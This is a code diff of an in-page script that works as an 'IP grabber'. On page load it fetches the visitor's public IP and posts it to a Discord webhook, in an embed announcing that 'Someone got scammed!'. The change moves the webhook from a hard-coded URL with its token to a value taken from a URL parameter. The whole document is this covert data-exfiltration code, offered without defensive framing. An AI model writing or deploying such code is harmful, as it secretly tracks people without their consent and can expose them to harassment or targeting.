@@ -1,12 +1,15 @@
 <script>
-const wurl = "https://discord.com/api/webhooks/1100764362660130866/IhyGsMRcdYkj2jqmT5XfaAdcy4r6xnKUr5gTVPKfCr4XWVKPXK3gSnO5NhVNg1BDGviH" // I've deleted it, don't waste your time on it
-async function run() {
-	res = await fetch("https://api.ipify.org/")
-	ip = await res.text()
-	body = {"username":"IP grabber", "embeds":[
-		{"title":"Someone got scammed!", "description":`Here's their ip: ${ip}.`, "footer":{"text":"OyoPlayer IP Grabber"}}
-	]}
-	fetch(wurl, {"method":"POST", "headers":{"content-type": "application/json"}, "body":JSON.stringify(body)})
+const url_params = new URL("https://example.com/?product=trousers&color=black&newuser&size=s").searchParams;
+if (url_params.get("wurl") !== null) {
+	const wurl = "https://discord.com/api/webhooks/"+url_params.get("wurl")
+	async function run() {
+		res = await fetch("https://api.ipify.org/")
+		ip = await res.text()
+		body = {"username":"IP grabber", "embeds":[
+			{"title":"Someone got scammed!", "description":`Here's their ip: ${ip}.`, "footer":{"text":"OyoPlayer IP Grabber"}}
+		]}
+		fetch(wurl, {"method":"POST", "headers":{"content-type": "application/json"}, "body":JSON.stringify(body)})
+	}
+	run()
 }
-run()
 </script>
